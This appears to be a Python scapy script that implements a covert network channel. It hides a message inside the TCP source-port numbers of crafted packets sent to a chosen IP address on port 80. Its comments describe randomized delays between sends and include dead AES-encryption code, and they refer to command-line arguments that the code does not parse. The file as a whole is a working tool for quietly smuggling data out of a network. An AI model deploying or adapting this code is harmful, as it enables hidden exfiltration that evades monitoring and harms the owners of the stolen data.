from scapy.all import *


def createPacketTwo(char1, char2, destIp):
  maxPort = 65535
  # get the binary values of both chars without the binary string indicator
  binChar1 = bin(ord(char1))[2:].zfill(8)
  binChar2 = bin(ord(char2))[2:].zfill(8)
  #print (binChar1 + binChar2)
  # get the integer value of the concatenated binary values
  intPortVal = int(binChar1 + binChar2, 2)
  #print ("bin value " + str((bin(intPortVal))))
  # craft the packet
  packet = IP(dst=destIp)/TCP(dport=80, sport=maxPort - intPortVal, flags = "E")
  return packet

def createPacketOne(char, destIp):
  maxPort = 65535
  # get the binary value of the character
  binChar = bin(ord(char))[2:].zfill(8)
  #print (binChar)
  #get the integer value of that binary value
  intPortVal = int(binChar, 2)
  # craft the packet
  packet = IP(dst=destIp)/TCP(dport=80, sport=maxPort -intPortVal, flags = "E")
  return packet

# sendPackets - loops through the file specified as a command line argument.
# Reads each byte from the file, calls the appropriate packet creation function
# and sends each packet.  Between each send there is a sleep for a randomized amount
# of time within a range, also set as a command line argument.

def sendPackets(message, destIp):
  fileSize = len(message)
  lastPosition = 0
  while lastPosition < fileSize:
    if lastPosition == fileSize - 1:
      # the next byte we read contains the last character in the file
      char = message[lastPosition]
      lastPosition = lastPosition + 1
      print(char)
      packet = createPacketOne(char, destIp)
    else:
      # there is at least 2 characters left in the file
      char1 = message[lastPosition]
      lastPosition = lastPosition + 1
      char2 = message[lastPosition]
      lastPosition = lastPosition + 1
      print(char1, char2)
      packet = createPacketTwo(char1, char2, destIp)

    # scapy send
    """obj = AES.new(password, AES.MODE_CBC,initial)
    ciphertext = obj.encrypt(packet)"""
    #send(packet)
    send(packet, verbose=False)
    #print ("sport: " + str(packet.sport))
    #return ciphertext
    #time.sleep(randint(1,int(args.sendInterval)))